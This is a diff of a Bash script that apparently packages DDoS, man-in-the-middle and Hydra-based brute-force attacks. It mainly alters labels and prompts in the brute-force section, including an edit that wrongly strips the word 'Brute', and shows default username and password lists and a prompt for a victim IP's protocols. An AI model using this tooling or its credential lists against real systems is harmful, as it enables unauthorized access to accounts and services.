@@ -88,22 +88,22 @@ function DESCRPTION_DDOS() {
 
 }
 
-#Descrption of BRUTEe forec attack 
-function DESCRPTION_BRUTE_FORCE() {
+#Descrption of e forec attack 
+function DESCRPTION__FORCE() {
 
     # Downloading and using figlet 
     if ! command -v figlet &> /dev/null; then
         sudo apt-get install -y figlet &> /dev/null 
     fi
     echo -e "${RED}$(figlet Description)"
-    echo -e "${RED}$(figlet Brute Force :0)"
+    echo -e "${RED}$(figlet  Force :0)"
     
-    echo -e "${ARK_GREEN_BOLD}[*]Brute Force Attack Description:"
+    echo -e "${ARK_GREEN_BOLD}[*] Force Attack Description:"
 
-    echo -e "${ORANGE_BOLD}Brute force attack on a specified victim's IP address, discovering available protocols."
+    echo -e "${ORANGE_BOLD} force attack on a specified victim's IP address, discovering available protocols."
     echo -e "Attempts to breach using default or custom credentials, iterating through a list of protocols."
     echo -e "Prompts for user input to proceed with default or custom username and password lists."
-    echo -e "Results are saved to Hydra_BRUTE.txt for analysis.${RESET}"
+    echo -e "Results are saved to Hydra_Brute.txt for analysis.${RESET}"
 
 
 
@@ -232,7 +232,7 @@ function INSTALL_MITM {
 }  
 
 
-#Download the necessary application for the BRUTE force attack
+#Download the necessary application for the brute force attack
 function INSTALL_BRUTE () {
 
     if ! command -v hydra &>/dev/null; then 
@@ -548,7 +548,7 @@ function ATTACK_BRUTE {
 
         # Input validation for protocols
         while true; do
-            read -rp "${WHITE_BOLD}[?] Enter the protocol(s) you want to BRUTE_Force (e.g., ssh,ftp,rdp...), or 'all' for all protocols: ${RESET}" PROTOCOLS_BRUTE
+            read -rp "${WHITE_BOLD}[?] Enter the protocol(s) you want to Brute_Force (e.g., ssh,ftp,rdp...), or 'all' for all protocols: ${RESET}" PROTOCOLS_BRUTE
             if [[ $PROTOCOLS_BRUTE == "all" ]]; then
                 PROTOCOLS=$(echo "$TARGET_NAMEDPORT" | cut -d' ' -f3- | tr ' ' '\n')  # Extract protocols from the Nmap output
                 break
@@ -565,7 +565,7 @@ function ATTACK_BRUTE {
             read -rp "${ORANGE_BOLD}[?] Would you like to use default password and username list (yes/no)? ${RESET}" DEFAULT
 
             if [[ $DEFAULT == "yes" ]]; then
-                echo "${ORANGE_BOLD}[*] Using default user and password list. BRUTEe force start...${RESET}"
+                echo "${ORANGE_BOLD}[*] Using default user and password list. Brute force start...${RESET}"
         
                 USERS=("kali" "root" "user" "admin" "msfadmin")
                 PASSWORDS=("kali" "123456" "admin" "letmein" "msfadmin" "qwerty" "123456789" "abc123" "111111" "123123" "admin123" "admin@123" "rotem999999" "rotem1234" "admin@1234" "Smolikn123" "adminadmin@123" "admin12345" "admin@12345" "adminadmin12345" "adminadmin@12345" "password123" "password@123" "password1234" "yesbabe@1234" "touchme12345" "yesyes@12345")
